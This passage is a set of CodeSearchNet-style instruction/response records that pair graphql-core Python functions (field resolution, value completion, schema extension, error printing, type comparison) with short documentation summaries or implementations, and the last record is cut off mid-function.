{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef does_fragment_condition_match(\n        self,\n        fragment: Union[FragmentDefinitionNode, InlineFragmentNode],\n        type_: GraphQLObjectType,\n    ) -> bool:\n        \"\"\"Determine if a fragment is applicable to the given type.\"\"\"\n        type_condition_node = fragment.type_condition\n        if not type_condition_node:\n            return True\n        conditional_type = type_from_ast(self.schema, type_condition_node)\n        if conditional_type is type_:\n            return True\n        if is_abstract_type(conditional_type):\n            return self.schema.is_possible_type(\n                cast(GraphQLAbstractType, conditional_type), type_\n            )\n        return False", "response": "Determine if a fragment is applicable to the given type."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef resolve_field(\n        self,\n        parent_type: GraphQLObjectType,\n        source: Any,\n        field_nodes: List[FieldNode],\n        path: ResponsePath,\n    ) -> AwaitableOrValue[Any]:\n        \"\"\"Resolve the field on the given source object.\n\n        In particular, this figures out the value that the field returns by calling its\n        resolve function, then calls complete_value to await coroutine objects,\n        serialize scalars, or execute the sub-selection-set for objects.\n        \"\"\"\n        field_node = field_nodes[0]\n        field_name = field_node.name.value\n\n        field_def = get_field_def(self.schema, parent_type, field_name)\n        if not field_def:\n            return INVALID\n\n        resolve_fn = field_def.resolve or self.field_resolver\n\n        if self.middleware_manager:\n            resolve_fn = self.middleware_manager.get_field_resolver(resolve_fn)\n\n        info = self.build_resolve_info(field_def, field_nodes, parent_type, path)\n\n        # Get the resolve function, regardless of if its result is normal or abrupt\n        # (error).\n        result = self.resolve_field_value_or_error(\n            field_def, field_nodes, resolve_fn, source, info\n        )\n\n        return self.complete_value_catching_error(\n            field_def.type, field_nodes, info, path, result\n        )", "response": "Resolves the given field on the given source object."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncompleting a value while catching an error.", "response": "def complete_value_catching_error(\n        self,\n        return_type: GraphQLOutputType,\n        field_nodes: List[FieldNode],\n        info: GraphQLResolveInfo,\n        path: ResponsePath,\n        result: Any,\n    ) -> AwaitableOrValue[Any]:\n        \"\"\"Complete a value while catching an error.\n\n        This is a small wrapper around completeValue which detects and logs errors in\n        the execution context.\n        \"\"\"\n        try:\n            if isawaitable(result):\n\n                async def await_result():\n                    value = self.complete_value(\n                        return_type, field_nodes, info, path, await result\n                    )\n                    if isawaitable(value):\n                        return await value\n                    return value\n\n                completed = await_result()\n            else:\n                completed = self.complete_value(\n                    return_type, field_nodes, info, path, result\n                )\n            if isawaitable(completed):\n                # noinspection PyShadowingNames\n                async def await_completed():\n                    try:\n                        return await completed\n                    except Exception as error:\n                        self.handle_field_error(error, field_nodes, path, return_type)\n\n                return await_completed()\n            return completed\n        except Exception as error:\n            self.handle_field_error(error, field_nodes, path, return_type)\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef complete_value(\n        self,\n        return_type: GraphQLOutputType,\n        field_nodes: List[FieldNode],\n        info: GraphQLResolveInfo,\n        path: ResponsePath,\n        result: Any,\n    ) -> AwaitableOrValue[Any]:\n        \"\"\"Complete a value.\n\n        Implements the instructions for completeValue as defined in the \"Field entries\"\n        section of the spec.\n\n        If the field type is Non-Null, then this recursively completes the value for the\n        inner type. It throws a field error if that completion returns null, as per the\n        \"Nullability\" section of the spec.\n\n        If the field type is a List, then this recursively completes the value for the\n        inner type on each item in the list.\n\n        If the field type is a Scalar or Enum, ensures the completed value is a legal\n        value of the type by calling the `serialize` method of GraphQL type definition.\n\n        If the field is an abstract type, determine the runtime type of the value and\n        then complete based on that type.\n\n        Otherwise, the field type expects a sub-selection set, and will complete the\n        value by evaluating all sub-selections.\n        \"\"\"\n        # If result is an Exception, throw a located error.\n        if isinstance(result, Exception):\n            raise result\n\n        # If field type is NonNull, complete for inner type, and throw field error if\n        # result is null.\n        if is_non_null_type(return_type):\n            completed = self.complete_value(\n                cast(GraphQLNonNull, return_type).of_type,\n                field_nodes,\n                info,\n                path,\n                result,\n            )\n            if completed is None:\n                raise TypeError(\n                    \"Cannot return null for non-nullable field\"\n                    f\" {info.parent_type.name}.{info.field_name}.\"\n                )\n            return completed\n\n        # If result value is null-ish (null, INVALID, or NaN) then return null.\n        if is_nullish(result):\n            return None\n\n        # If field type is List, complete each item in the list with inner type\n        if is_list_type(return_type):\n            return self.complete_list_value(\n                cast(GraphQLList, return_type), field_nodes, info, path, result\n            )\n\n        # If field type is a leaf type, Scalar or Enum, serialize to a valid value,\n        # returning null if serialization is not possible.\n        if is_leaf_type(return_type):\n            return self.complete_leaf_value(cast(GraphQLLeafType, return_type), result)\n\n        # If field type is an abstract type, Interface or Union, determine the runtime\n        # Object type and complete for that type.\n        if is_abstract_type(return_type):\n            return self.complete_abstract_value(\n                cast(GraphQLAbstractType, return_type), field_nodes, info, path, result\n            )\n\n        # If field type is Object, execute and complete all sub-selections.\n        if is_object_type(return_type):\n            return self.complete_object_value(\n                cast(GraphQLObjectType, return_type), field_nodes, info, path, result\n            )\n\n        # Not reachable. All possible output types have been considered.\n        raise TypeError(  # pragma: no cover\n            \"Cannot complete value of unexpected output type:\"\n            f\" '{inspect(return_type)}'.\"\n        )", "response": "Complete a value for the given key."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncompletes a list value by completing each item in the list with the inner type.", "response": "def complete_list_value(\n        self,\n        return_type: GraphQLList[GraphQLOutputType],\n        field_nodes: List[FieldNode],\n        info: GraphQLResolveInfo,\n        path: ResponsePath,\n        result: Iterable[Any],\n    ) -> AwaitableOrValue[Any]:\n        \"\"\"Complete a list value.\n\n        Complete a list value by completing each item in the list with the inner type.\n        \"\"\"\n        if not isinstance(result, Iterable) or isinstance(result, str):\n            raise TypeError(\n                \"Expected Iterable, but did not find one for field\"\n                f\" {info.parent_type.name}.{info.field_name}.\"\n            )\n\n        # This is specified as a simple map, however we're optimizing the path where\n        # the list contains no coroutine objects by avoiding creating another coroutine\n        # object.\n        item_type = return_type.of_type\n        awaitable_indices: List[int] = []\n        append_awaitable = awaitable_indices.append\n        completed_results: List[Any] = []\n        append_result = completed_results.append\n        for index, item in enumerate(result):\n            # No need to modify the info object containing the path, since from here on\n            # it is not ever accessed by resolver functions.\n            field_path = add_path(path, index)\n            completed_item = self.complete_value_catching_error(\n                item_type, field_nodes, info, field_path, item\n            )\n\n            if isawaitable(completed_item):\n                append_awaitable(index)\n            append_result(completed_item)\n\n        if not awaitable_indices:\n            return completed_results\n\n        # noinspection PyShadowingNames\n        async def get_completed_results():\n            for index, result in zip(\n                awaitable_indices,\n                await gather(\n                    *(completed_results[index] for index in awaitable_indices)\n                ),\n            ):\n                completed_results[index] = result\n            return completed_results\n\n        return get_completed_results()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef complete_leaf_value(return_type: GraphQLLeafType, result: Any) -> Any:\n        serialized_result = return_type.serialize(result)\n        if is_invalid(serialized_result):\n            raise TypeError(\n                f\"Expected a value of type '{inspect(return_type)}'\"\n                f\" but received: {inspect(result)}\"\n            )\n        return serialized_result", "response": "Complete a leaf value by serializing to a valid value returning null if it is not possible."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef complete_abstract_value(\n        self,\n        return_type: GraphQLAbstractType,\n        field_nodes: List[FieldNode],\n        info: GraphQLResolveInfo,\n        path: ResponsePath,\n        result: Any,\n    ) -> AwaitableOrValue[Any]:\n        \"\"\"Complete an abstract value.\n\n        Complete a value of an abstract type by determining the runtime object type of\n        that value, then complete the value for that type.\n        \"\"\"\n        resolve_type_fn = return_type.resolve_type or self.type_resolver\n        runtime_type = resolve_type_fn(result, info, return_type)  # type: ignore\n\n        if isawaitable(runtime_type):\n\n            async def await_complete_object_value():\n                value = self.complete_object_value(\n                    self.ensure_valid_runtime_type(\n                        await runtime_type, return_type, field_nodes, info, result\n                    ),\n                    field_nodes,\n                    info,\n                    path,\n                    result,\n                )\n                if isawaitable(value):\n                    return await value\n                return value\n\n            return await_complete_object_value()\n        runtime_type = cast(Optional[Union[GraphQLObjectType, str]], runtime_type)\n\n        return self.complete_object_value(\n            self.ensure_valid_runtime_type(\n                runtime_type, return_type, field_nodes, info, result\n            ),\n            field_nodes,\n            info,\n            path,\n            result,\n        )", "response": "Complete an abstract value."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncompleting an object value by executing all sub - selections.", "response": "def complete_object_value(\n        self,\n        return_type: GraphQLObjectType,\n        field_nodes: List[FieldNode],\n        info: GraphQLResolveInfo,\n        path: ResponsePath,\n        result: Any,\n    ) -> AwaitableOrValue[Dict[str, Any]]:\n        \"\"\"Complete an Object value by executing all sub-selections.\"\"\"\n        # If there is an `is_type_of()` predicate function, call it with the current\n        # result. If `is_type_of()` returns False, then raise an error rather than\n        #  continuing execution.\n        if return_type.is_type_of:\n            is_type_of = return_type.is_type_of(result, info)\n\n            if isawaitable(is_type_of):\n\n                async def collect_and_execute_subfields_async():\n                    if not await is_type_of:\n                        raise invalid_return_type_error(\n                            return_type, result, field_nodes\n                        )\n                    return self.collect_and_execute_subfields(\n                        return_type, field_nodes, path, result\n                    )\n\n                return collect_and_execute_subfields_async()\n\n            if not is_type_of:\n                raise invalid_return_type_error(return_type, result, field_nodes)\n\n        return self.collect_and_execute_subfields(\n            return_type, field_nodes, path, result\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncollects sub - fields to execute to complete this value.", "response": "def collect_and_execute_subfields(\n        self,\n        return_type: GraphQLObjectType,\n        field_nodes: List[FieldNode],\n        path: ResponsePath,\n        result: Any,\n    ) -> AwaitableOrValue[Dict[str, Any]]:\n        \"\"\"Collect sub-fields to execute to complete this value.\"\"\"\n        sub_field_nodes = self.collect_subfields(return_type, field_nodes)\n        return self.execute_fields(return_type, result, path, sub_field_nodes)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef collect_subfields(\n        self, return_type: GraphQLObjectType, field_nodes: List[FieldNode]\n    ) -> Dict[str, List[FieldNode]]:\n        \"\"\"Collect subfields.\n\n        A cached collection of relevant subfields with regard to the return type is\n        kept in the execution context as `_subfields_cache`. This ensures the\n        subfields are not repeatedly calculated, which saves overhead when resolving\n        lists of values.\n        \"\"\"\n        cache_key = return_type, tuple(field_nodes)\n        sub_field_nodes = self._subfields_cache.get(cache_key)\n        if sub_field_nodes is None:\n            sub_field_nodes = {}\n            visited_fragment_names: Set[str] = set()\n            for field_node in field_nodes:\n                selection_set = field_node.selection_set\n                if selection_set:\n                    sub_field_nodes = self.collect_fields(\n                        return_type,\n                        selection_set,\n                        sub_field_nodes,\n                        visited_fragment_names,\n                    )\n            self._subfields_cache[cache_key] = sub_field_nodes\n        return sub_field_nodes", "response": "Collect subfields.\n\n        A cached collection of relevant subfields with regard to the return type is\n        kept in the execution context as `_subfields_cache`. This ensures the\n        subfields are not repeatedly calculated, which saves overhead when resolving\n        lists of values."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_operation_root_type(\n    schema: GraphQLSchema,\n    operation: Union[OperationDefinitionNode, OperationTypeDefinitionNode],\n) -> GraphQLObjectType:\n    \"\"\"Extract the root type of the operation from the schema.\"\"\"\n    operation_type = operation.operation\n    if operation_type == OperationType.QUERY:\n        query_type = schema.query_type\n        if not query_type:\n            raise GraphQLError(\n                \"Schema does not define the required query root type.\", operation\n            )\n        return query_type\n    elif operation_type == OperationType.MUTATION:\n        mutation_type = schema.mutation_type\n        if not mutation_type:\n            raise GraphQLError(\"Schema is not configured for mutations.\", operation)\n        return mutation_type\n    elif operation_type == OperationType.SUBSCRIPTION:\n        subscription_type = schema.subscription_type\n        if not subscription_type:\n            raise GraphQLError(\"Schema is not configured for subscriptions.\", operation)\n        return subscription_type\n    else:\n        raise GraphQLError(\n            \"Can only have query, mutation and subscription operations.\", operation\n        )", "response": "Extract the root type of the operation from the schema."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef is_specified_directive(directive: GraphQLDirective):\n    return isinstance(directive, GraphQLDirective) and any(\n        specified_directive.name == directive.name\n        for specified_directive in specified_directives\n    )", "response": "Check whether the given directive is one of the specified directives."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef extend_schema(\n    schema: GraphQLSchema,\n    document_ast: DocumentNode,\n    assume_valid=False,\n    assume_valid_sdl=False,\n) -> GraphQLSchema:\n    \"\"\"Extend the schema with extensions from a given document.\n\n    Produces a new schema given an existing schema and a document which may contain\n    GraphQL type extensions and definitions. The original schema will remain unaltered.\n\n    Because a schema represents a graph of references, a schema cannot be extended\n    without effectively making an entire copy. We do not know until it's too late if\n    subgraphs remain unchanged.\n\n    This algorithm copies the provided schema, applying extensions while producing the\n    copy. The original schema remains unaltered.\n\n    When extending a schema with a known valid extension, it might be safe to assume the\n    schema is valid. Set `assume_valid` to true to assume the produced schema is valid.\n    Set `assume_valid_sdl` to True to assume it is already a valid SDL document.\n    \"\"\"\n    assert_schema(schema)\n\n    if not isinstance(document_ast, DocumentNode):\n        \"Must provide valid Document AST\"\n\n    if not (assume_valid or assume_valid_sdl):\n        from ..validation.validate import assert_valid_sdl_extension\n\n        assert_valid_sdl_extension(document_ast, schema)\n\n    # Collect the type definitions and extensions found in the document.\n    type_defs: List[TypeDefinitionNode] = []\n    type_exts_map: Dict[str, Any] = defaultdict(list)\n\n    # New directives and types are separate because a directives and types can have the\n    # same name. For example, a type named \"skip\".\n    directive_defs: List[DirectiveDefinitionNode] = []\n\n    schema_def: Optional[SchemaDefinitionNode] = None\n    # Schema extensions are collected which may add additional operation types.\n    schema_exts: List[SchemaExtensionNode] = []\n\n    for def_ in document_ast.definitions:\n        if isinstance(def_, SchemaDefinitionNode):\n            schema_def = def_\n        elif isinstance(def_, SchemaExtensionNode):\n            schema_exts.append(def_)\n        elif isinstance(def_, TypeDefinitionNode):\n            type_defs.append(def_)\n        elif isinstance(def_, TypeExtensionNode):\n            extended_type_name = def_.name.value\n            type_exts_map[extended_type_name].append(def_)\n        elif isinstance(def_, DirectiveDefinitionNode):\n            directive_defs.append(def_)\n\n    # If this document contains no new types, extensions, or directives then return the\n    # same unmodified GraphQLSchema instance.\n    if (\n        not type_exts_map\n        and not type_defs\n        and not directive_defs\n        and not schema_exts\n        and not schema_def\n    ):\n        return schema\n\n    # Below are functions used for producing this schema that have closed over this\n    # scope and have access to the schema, cache, and newly defined types.\n\n    # noinspection PyTypeChecker,PyUnresolvedReferences\n    def replace_type(type_: GraphQLType) -> GraphQLType:\n        if is_list_type(type_):\n            return GraphQLList(replace_type(type_.of_type))  # type: ignore\n        if is_non_null_type(type_):\n            return GraphQLNonNull(replace_type(type_.of_type))  # type: ignore\n        return replace_named_type(type_)  # type: ignore\n\n    def replace_named_type(type_: GraphQLNamedType) -> GraphQLNamedType:\n        return type_map[type_.name]\n\n    def get_maybe_type_by_name(type_name: Optional[str]) -> Optional[GraphQLNamedType]:\n        return type_map[type_name] if type_name else None\n\n    def get_merged_directives() -> List[GraphQLDirective]:\n        if not schema.directives:\n            raise TypeError(\"schema must have default directives\")\n\n        return list(\n            chain(\n                map(extend_directive, schema.directives),\n                map(ast_builder.build_directive, directive_defs),\n            )\n        )\n\n    def extend_named_type(type_: GraphQLNamedType) -> GraphQLNamedType:\n        if is_introspection_type(type_) or is_specified_scalar_type(type_):\n            # Builtin types are not extended.\n            return type_\n        if is_scalar_type(type_):\n            type_ = cast(GraphQLScalarType, type_)\n            return extend_scalar_type(type_)\n        if is_object_type(type_):\n            type_ = cast(GraphQLObjectType, type_)\n            return extend_object_type(type_)\n        if is_interface_type(type_):\n            type_ = cast(GraphQLInterfaceType, type_)\n            return extend_interface_type(type_)\n        if is_union_type(type_):\n            type_ = cast(GraphQLUnionType, type_)\n            return extend_union_type(type_)\n        if is_enum_type(type_):\n            type_ = cast(GraphQLEnumType, type_)\n            return extend_enum_type(type_)\n        if is_input_object_type(type_):\n            type_ = cast(GraphQLInputObjectType, type_)\n            return extend_input_object_type(type_)\n\n        # Not reachable. All possible types have been considered.\n        raise TypeError(f\"Unexpected type: '{inspect(type_)}'.\")  # pragma: no cover\n\n    def extend_directive(directive: GraphQLDirective) -> GraphQLDirective:\n        kwargs = directive.to_kwargs()\n        return GraphQLDirective(  # type: ignore\n            **{\n                **kwargs,\n                \"args\": {name: extend_arg(arg) for name, arg in kwargs[\"args\"].items()},\n            }\n        )\n\n    def extend_input_object_type(\n        type_: GraphQLInputObjectType\n    ) -> GraphQLInputObjectType:\n        kwargs = type_.to_kwargs()\n        extensions = type_exts_map.get(kwargs[\"name\"], [])\n        field_nodes = chain.from_iterable(node.fields or [] for node in extensions)\n\n        return GraphQLInputObjectType(\n            **{\n                **kwargs,\n                \"fields\": lambda: {\n                    **{\n                        name: GraphQLInputField(  # type: ignore\n                            **{**field.to_kwargs(), \"type_\": replace_type(field.type)}\n                        )\n                        for name, field in kwargs[\"fields\"].items()\n                    },\n                    **{\n                        field.name.value: ast_builder.build_input_field(field)\n                        for field in field_nodes\n                    },\n                },\n                \"extension_ast_nodes\": kwargs[\"extension_ast_nodes\"]\n                + tuple(extensions),\n            }\n        )\n\n    def extend_enum_type(type_: GraphQLEnumType) -> GraphQLEnumType:\n        kwargs = type_.to_kwargs()\n        extensions = type_exts_map.get(kwargs[\"name\"], [])\n        value_nodes = chain.from_iterable(node.values or [] for node in extensions)\n\n        return GraphQLEnumType(\n            **{\n                **kwargs,\n                \"values\": {\n                    **kwargs[\"values\"],\n                    **{\n                        value.name.value: ast_builder.build_enum_value(value)\n                        for value in value_nodes\n                    },\n                },\n                \"extension_ast_nodes\": kwargs[\"extension_ast_nodes\"]\n                + tuple(extensions),\n            }\n        )\n\n    def extend_scalar_type(type_: GraphQLScalarType) -> GraphQLScalarType:\n        kwargs = type_.to_kwargs()\n        extensions = type_exts_map.get(kwargs[\"name\"], [])\n\n        return GraphQLScalarType(\n            **{\n                **kwargs,\n                \"extension_ast_nodes\": kwargs[\"extension_ast_nodes\"]\n                + tuple(extensions),\n            }\n        )\n\n    def extend_object_type(type_: GraphQLObjectType) -> GraphQLObjectType:\n        kwargs = type_.to_kwargs()\n        extensions = type_exts_map.get(kwargs[\"name\"], [])\n        interface_nodes = chain.from_iterable(\n            node.interfaces or [] for node in extensions\n        )\n        field_nodes = chain.from_iterable(node.fields or [] for node in extensions)\n\n        return GraphQLObjectType(\n            **{\n                **kwargs,\n                \"interfaces\": lambda: [\n                    replace_named_type(interface) for interface in kwargs[\"interfaces\"]\n                ]\n                # Note: While this could make early assertions to get the correctly\n                # typed values, that would throw immediately while type system\n                # validation with validate_schema will produce more actionable results.\n                + [ast_builder.get_named_type(node) for node in interface_nodes],\n                \"fields\": lambda: {\n                    **{\n                        name: extend_field(field)\n                        for name, field in kwargs[\"fields\"].items()\n                    },\n                    **{\n                        node.name.value: ast_builder.build_field(node)\n                        for node in field_nodes\n                    },\n                },\n                \"extension_ast_nodes\": kwargs[\"extension_ast_nodes\"]\n                + tuple(extensions),\n            }\n        )\n\n    def extend_interface_type(type_: GraphQLInterfaceType) -> GraphQLInterfaceType:\n        kwargs = type_.to_kwargs()\n        extensions = type_exts_map.get(kwargs[\"name\"], [])\n        field_nodes = chain.from_iterable(node.fields or [] for node in extensions)\n\n        return GraphQLInterfaceType(\n            **{\n                **kwargs,\n                \"fields\": lambda: {\n                    **{\n                        name: extend_field(field)\n                        for name, field in kwargs[\"fields\"].items()\n                    },\n                    **{\n                        node.name.value: ast_builder.build_field(node)\n                        for node in field_nodes\n                    },\n                },\n                \"extension_ast_nodes\": kwargs[\"extension_ast_nodes\"]\n                + tuple(extensions),\n            }\n        )\n\n    def extend_union_type(type_: GraphQLUnionType) -> GraphQLUnionType:\n        kwargs = type_.to_kwargs()\n        extensions = type_exts_map.get(kwargs[\"name\"], [])\n        type_nodes = chain.from_iterable(node.types or [] for node in extensions)\n\n        return GraphQLUnionType(\n            **{\n                **kwargs,\n                \"types\": lambda: [\n                    replace_named_type(member_type) for member_type in kwargs[\"types\"]\n                ]\n                # Note: While this could make early assertions to get the correctly\n                # typed values, that would throw immediately while type system\n                # validation with validate_schema will produce more actionable results.\n                + [ast_builder.get_named_type(node) for node in type_nodes],\n                \"extension_ast_nodes\": kwargs[\"extension_ast_nodes\"]\n                + tuple(extensions),\n            }\n        )\n\n    def extend_field(field: GraphQLField) -> GraphQLField:\n        return GraphQLField(  # type: ignore\n            **{\n                **field.to_kwargs(),\n                \"type_\": replace_type(field.type),\n                \"args\": {name: extend_arg(arg) for name, arg in field.args.items()},\n            }\n        )\n\n    def extend_arg(arg: GraphQLArgument) -> GraphQLArgument:\n        return GraphQLArgument(  # type: ignore\n            **{**arg.to_kwargs(), \"type_\": replace_type(arg.type)}\n        )\n\n    # noinspection PyShadowingNames\n    def resolve_type(type_name: str) -> GraphQLNamedType:\n        type_ = type_map.get(type_name)\n        if not type_:\n            raise TypeError(f\"Unknown type: '{type_name}'.\")\n        return type_\n\n    ast_builder = ASTDefinitionBuilder(\n        assume_valid=assume_valid, resolve_type=resolve_type\n    )\n\n    type_map = {node.name.value: ast_builder.build_type(node) for node in type_defs}\n    for existing_type_name, existing_type in schema.type_map.items():\n        type_map[existing_type_name] = extend_named_type(existing_type)\n\n    # Get the extended root operation types.\n    operation_types: Dict[OperationType, Optional[str]] = {\n        OperationType.QUERY: schema.query_type.name if schema.query_type else None,\n        OperationType.MUTATION: schema.mutation_type.name\n        if schema.mutation_type\n        else None,\n        OperationType.SUBSCRIPTION: schema.subscription_type.name\n        if schema.subscription_type\n        else None,\n    }\n\n    if schema_def:\n        for operation_type in schema_def.operation_types:\n            operation = operation_type.operation\n            operation_types[operation] = operation_type.type.name.value\n\n    # Then, incorporate schema definition and all schema extensions.\n    for schema_ext in schema_exts:\n        if schema_ext.operation_types:\n            for operation_type in schema_ext.operation_types:\n                operation = operation_type.operation\n                operation_types[operation] = operation_type.type.name.value\n\n    # Then produce and return a Schema with these types.\n    return GraphQLSchema(  # type: ignore\n        # Note: While this could make early assertions to get the correctly\n        # typed values, that would throw immediately while type system\n        # validation with validateSchema() will produce more actionable results.\n        query=get_maybe_type_by_name(operation_types[OperationType.QUERY]),\n        mutation=get_maybe_type_by_name(operation_types[OperationType.MUTATION]),\n        subscription=get_maybe_type_by_name(\n            operation_types[OperationType.SUBSCRIPTION]\n        ),\n        types=list(type_map.values()),\n        directives=get_merged_directives(),\n        ast_node=schema_def or schema.ast_node,\n        extension_ast_nodes=(\n            schema.extension_ast_nodes or cast(Tuple[SchemaExtensionNode], ())\n        )\n        + tuple(schema_exts),\n    )", "response": "Extends a schema with extensions from a given document."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef print_error(error: \"GraphQLError\") -> str:\n    printed_locations: List[str] = []\n    print_location = printed_locations.append\n    if error.nodes:\n        for node in error.nodes:\n            if node.loc:\n                print_location(\n                    highlight_source_at_location(\n                        node.loc.source, node.loc.source.get_location(node.loc.start)\n                    )\n                )\n    elif error.source and error.locations:\n        source = error.source\n        for location in error.locations:\n            print_location(highlight_source_at_location(source, location))\n    if printed_locations:\n        return \"\\n\\n\".join([error.message] + printed_locations) + \"\\n\"\n    return error.message", "response": "Print a GraphQLError to a string."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nhighlight source at given location.", "response": "def highlight_source_at_location(source: \"Source\", location: \"SourceLocation\") -> str:\n    \"\"\"Highlight source at given location.\n\n    This renders a helpful description of the location of the error in the GraphQL\n    Source document.\n    \"\"\"\n    first_line_column_offset = source.location_offset.column - 1\n    body = \" \" * first_line_column_offset + source.body\n\n    line_index = location.line - 1\n    line_offset = source.location_offset.line - 1\n    line_num = location.line + line_offset\n\n    column_offset = first_line_column_offset if location.line == 1 else 0\n    column_num = location.column + column_offset\n\n    lines = _re_newline.split(body)  # works a bit different from splitlines()\n    len_lines = len(lines)\n\n    def get_line(index: int) -> Optional[str]:\n        return lines[index] if 0 <= index < len_lines else None\n\n    return f\"{source.name} ({line_num}:{column_num})\\n\" + print_prefixed_lines(\n        [\n            (f\"{line_num - 1}: \", get_line(line_index - 1)),\n            (f\"{line_num}: \", get_line(line_index)),\n            (\"\", \" \" * (column_num - 1) + \"^\"),\n            (f\"{line_num + 1}: \", get_line(line_index + 1)),\n        ]\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nprinting lines specified like this : [ prefix string ]", "response": "def print_prefixed_lines(lines: List[Tuple[str, Optional[str]]]) -> str:\n    \"\"\"Print lines specified like this: [\"prefix\", \"string\"]\"\"\"\n    existing_lines = [line for line in lines if line[1] is not None]\n    pad_len = reduce(lambda pad, line: max(pad, len(line[0])), existing_lines, 0)\n    return \"\\n\".join(\n        map(\n            lambda line: line[0].rjust(pad_len) + line[1], existing_lines  # type:ignore\n        )\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef trunc_str(s: str) -> str:\n    if len(s) > max_str_size:\n        i = max(0, (max_str_size - 3) // 2)\n        j = max(0, max_str_size - 3 - i)\n        s = s[:i] + \"...\" + s[-j:]\n    return s", "response": "Truncate strings to maximum length."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ntruncate lists to maximum length.", "response": "def trunc_list(s: List) -> List:\n    \"\"\"Truncate lists to maximum length.\"\"\"\n    if len(s) > max_list_size:\n        i = max_list_size // 2\n        j = i - 1\n        s = s[:i] + [ELLIPSIS] + s[-j:]\n    return s"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngives a list of strings return either A B or C.", "response": "def quoted_or_list(items: List[str]) -> Optional[str]:\n    \"\"\"Given [A, B, C] return \"'A', 'B', or 'C'\".\n\n    Note: We use single quotes here, since these are also used by repr().\n    \"\"\"\n    return or_list([f\"'{item}'\" for item in items])"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef dedent_block_string_value(raw_string: str) -> str:\n    lines = raw_string.splitlines()\n\n    common_indent = None\n    for line in lines[1:]:\n        indent = leading_whitespace(line)\n        if indent < len(line) and (common_indent is None or indent < common_indent):\n            common_indent = indent\n        if common_indent == 0:\n            break\n\n    if common_indent:\n        lines[1:] = [line[common_indent:] for line in lines[1:]]\n\n    while lines and not lines[0].strip():\n        lines = lines[1:]\n\n    while lines and not lines[-1].strip():\n        lines = lines[:-1]\n\n    return \"\\n\".join(lines)", "response": "Produce the value of a block string from its parsed raw value."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef print_block_string(\n    value: str, indentation: str = \"\", prefer_multiple_lines: bool = False\n) -> str:\n    \"\"\"Print a block string in the indented block form.\n\n    Prints a block string in the indented block form by adding a leading and\n    trailing blank line. However, if a block string starts with whitespace and\n    is a single-line, adding a leading blank line would strip that whitespace.\n    \"\"\"\n    is_single_line = \"\\n\" not in value\n    has_leading_space = value.startswith(\" \") or value.startswith(\"\\t\")\n    has_trailing_quote = value.endswith('\"')\n    print_as_multiple_lines = (\n        not is_single_line or has_trailing_quote or prefer_multiple_lines\n    )\n\n    # Format a multi-line block quote to account for leading space.\n    if print_as_multiple_lines and not (is_single_line and has_leading_space):\n        result = \"\\n\" + indentation\n    else:\n        result = \"\"\n    result += value.replace(\"\\n\", \"\\n\" + indentation) if indentation else value\n    if print_as_multiple_lines:\n        result += \"\\n\"\n\n    return '\"\"\"' + result.replace('\"\"\"', '\\\\\"\"\"') + '\"\"\"'", "response": "Print a block string in the indented block form."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef is_equal_type(type_a: GraphQLType, type_b: GraphQLType):\n    # Equivalent types are equal.\n    if type_a is type_b:\n        return True\n\n    # If either type is non-null, the other must also be non-null.\n    if is_non_null_type(type_a) and is_non_null_type(type_b):\n        # noinspection PyUnresolvedReferences\n        return is_equal_type(type_a.of_type, type_b.of_type)  # type:ignore\n\n    # If either type is a list, the other must also be a list.\n    if is_list_type(type_a) and is_list_type(type_b):\n        # noinspection PyUnresolvedReferences\n        return is_equal_type(type_a.of_type, type_b.of_type)  # type:ignore\n\n    # Otherwise the types are not equal.\n    return False", "response": "Check whether two types are equal."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nchecking whether a type is subtype of another type in a given schema.", "response": "def is_type_sub_type_of(\n    schema: GraphQLSchema, maybe_subtype: GraphQLType, super_type: GraphQLType\n) -> bool:\n    \"\"\"Check whether a type is subtype of another type in a given schema.\n\n    Provided a type and a super type, return true if the first type is either equal or\n    a subset of the second super type (covariant).\n    \"\"\"\n    # Equivalent type is a valid subtype\n    if maybe_subtype is super_type:\n        return True\n\n    # If super_type is non-null, maybe_subtype must also be non-null.\n    if is_non_null_type(super_type):\n        if is_non_null_type(maybe_subtype):\n            return is_type_sub_type_of(\n                schema,\n                cast(GraphQLNonNull, maybe_subtype).of_type,\n                cast(GraphQLNonNull, super_type).of_type,\n            )\n        return False\n    elif is_non_null_type(maybe_subtype):\n        # If super_type is nullable, maybe_subtype may be non-null or nullable.\n        return is_type_sub_type_of(\n            schema, cast(GraphQLNonNull, maybe_subtype).of_type, super_type\n        )\n\n    # If superType type is a list, maybeSubType type must also be a list.\n    if is_list_type(super_type):\n        if is_list_type(maybe_subtype):\n            return is_type_sub_type_of(\n                schema,\n                cast(GraphQLList, maybe_subtype).of_type,\n                cast(GraphQLList, super_type).of_type,\n            )\n        return False\n    elif is_list_type(maybe_subtype):\n        # If super_type is not a list, maybe_subtype must also be not a list.\n        return False\n\n    # If super_type type is an abstract type, maybe_subtype type may be a 